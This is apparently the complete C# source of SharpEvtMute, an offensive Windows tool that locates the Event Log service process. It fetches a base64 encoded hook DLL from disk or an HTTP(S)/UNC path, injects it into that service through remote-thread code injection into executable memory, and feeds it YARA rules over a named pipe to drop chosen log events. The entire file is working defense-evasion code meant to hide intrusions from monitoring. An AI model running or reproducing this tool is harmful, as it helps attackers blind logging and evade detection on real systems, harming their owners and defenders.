using System;
using NDesk.Options;
using System.IO.Pipes;
using System.Diagnostics;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;

namespace SharpEvtMute
{
    class EvtMute
    {

        [DllImport("kernel32.dll")]
        public static extern IntPtr CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        const uint PAGE_EXECUTE_READWRITE = 0x00000040;
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const int PROCESS_ALL_ACCESS = 0x001FFFFF;

        static int FindEvtSvc()
        {
            Process[] proclist = Process.GetProcesses();

            foreach (Process proc in proclist)
            {
                try
                {
                    foreach (ProcessModule module in proc.Modules)
                    {
                        if (module.ToString().Contains("wevtsvc.dll"))
                        {
                            return proc.Id;
                        }
                    }
                }
                catch { }
            }

            return -1;
        }

        static bool InjectHook(int pid, string path)
        {
            var EvtSvcHook = "";
            //fetch the DLL from a file path
            try
            {
                if(path.StartsWith("https") || path.StartsWith("http"))
                {
                    //assume this is a web request, so go fetch the file
                    var request = WebRequest.Create(path) as HttpWebRequest;
                    var response = (HttpWebResponse)request.GetResponse();
                    if(response.StatusCode != HttpStatusCode.OK)
                    {
                        Console.WriteLine("[!] Non-200 response recieved");
                        return false;
                    }
                    var encoding = ASCIIEncoding.ASCII;
                    using (var reader = new System.IO.StreamReader(response.GetResponseStream(), encoding))
                    {
                        EvtSvcHook = reader.ReadToEnd();
                    }
                }
                else
                {
                    //assume this is a file path
                    EvtSvcHook = System.IO.File.ReadAllText(path);
                    if (EvtSvcHook.Length == 0)
                    {
                        Console.WriteLine("[!] Failed to read DLL");
                        return false;
                    }
                }
                
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Fetch DLL: FAILED");
                Console.WriteLine(ex.Message);
            }

            IntPtr hThread;
            IntPtr hProcess;
            IntPtr lpBuffer;
            bool bWriteSuccess;
            UIntPtr dwBytesWritten;

            byte[] lpDecodedHook = System.Convert.FromBase64String(EvtSvcHook);

            hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
            if (hProcess == null)
            {
                Console.WriteLine("[!] OpenProcess(): FAILED");
                return false;
            }

            lpBuffer = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)lpDecodedHook.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (lpBuffer == null)
            {
                Console.WriteLine("[!] VirtualAllocEx(): FAILED");
                return false;
            }

            bWriteSuccess = WriteProcessMemory(hProcess, lpBuffer, lpDecodedHook, (uint)lpDecodedHook.Length, out dwBytesWritten);
            if (bWriteSuccess == false)
            {
                Console.WriteLine("[!] WriteProcessMemory(): FAILED");
                return false;
            }

            hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, lpBuffer, IntPtr.Zero, 0, IntPtr.Zero);
            if (hThread == null)
            {
                Console.WriteLine("[!] CreateRemoteThread(): FAILED");
                return false;
            }

            CloseHandle(hProcess);

            return true;
        }

        static void ShowHelp(OptionSet p)
        {
            Console.WriteLine("Usage: sharpevtmute [-p/--Pid] [-i/--Inject] [-d/--Path] [-e/--Encoded] [-f/--Filter]");
            Console.WriteLine("Options:");
            p.WriteOptionDescriptions(Console.Out);
        }

        static bool UpdateFilterRule(string Rule, bool bIsB64)
        {

            if (bIsB64 == true)
            {
                Rule = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(Rule));
            }

            var EvtSvcPipe = new NamedPipeClientStream(".", "EvtMuteHook_Rule_Pipe", PipeDirection.Out, PipeOptions.None, System.Security.Principal.TokenImpersonationLevel.Impersonation);

            try
            {
                EvtSvcPipe.Connect(5000);
            }
            catch (TimeoutException)
            {
                Console.WriteLine("[!] Connection timed out. Have you injected the hook?");
                return false;
            }

            EvtSvcPipe.Write(System.Text.Encoding.ASCII.GetBytes(Rule), 0, System.Text.Encoding.ASCII.GetBytes(Rule).Length);
            EvtSvcPipe.Dispose();

            Console.WriteLine("[+] Yara filter has been updated");

            return true;
        }

        static void Main(string[] args)
        {
            int pid = 0;
            bool bB64Rule = false;
            List<string> extra;
            string NewRule = null;
            bool bDoHooking = false;
            bool bOnlyFindPid = false;
            string DllPath = "";

            Console.WriteLine("SharpEvtMute by @_batsec_");
            Console.WriteLine("Updated by @two06\n");

            var p = new OptionSet()
            {
                { "p|Pid", "Find the PID of the event service.", v => { bOnlyFindPid = true; } },
                { "i|Inject", "Inject the hook into the event service", v => { bDoHooking = true; bOnlyFindPid = true; } },
                { "d|Path=", "Path to encoded DLL (file system, UNC or HTTP(s))", v => { DllPath = v; } },
                { "f|Filter=", "Yara rule {FILTER} to apply", v => { NewRule = v; } },
                { "e|Encoded", "Filter will be treated as base64 encoded", v => { bB64Rule = true; } }
            };

            try
            {
                extra = p.Parse(args);
            }
            catch (OptionException e)
            {
                Console.WriteLine(e.Message);
                return;
            }

            if (args.Length == 0)
            {
                ShowHelp(p);
                return;
            }
            

            if (bOnlyFindPid == true)
            {
                pid = FindEvtSvc();
                if (pid == -1)
                {
                    Console.WriteLine("[!] Failed to find wevtsvc.dll, you got the correct privs?");
                    return;
                }

                Console.WriteLine("[i] Found PID: {0}", pid);
            }

            if (bDoHooking == true)
            {
                if (String.IsNullOrWhiteSpace(DllPath))
                {
                    Console.WriteLine("[!] DLL path must be provided for this option");
                    ShowHelp(p);
                    return;
                }
                bool bSuccess = InjectHook(pid, DllPath);
                if (bSuccess == true)
                {
                    Console.WriteLine("[+] Injected hook");
                }
                else
                {
                    Console.WriteLine("[!] Failed to inject hook, check your privs");
                }
            }

            if (NewRule != null)
            {
                UpdateFilterRule(NewRule, bB64Rule);
            }
        }
    }
}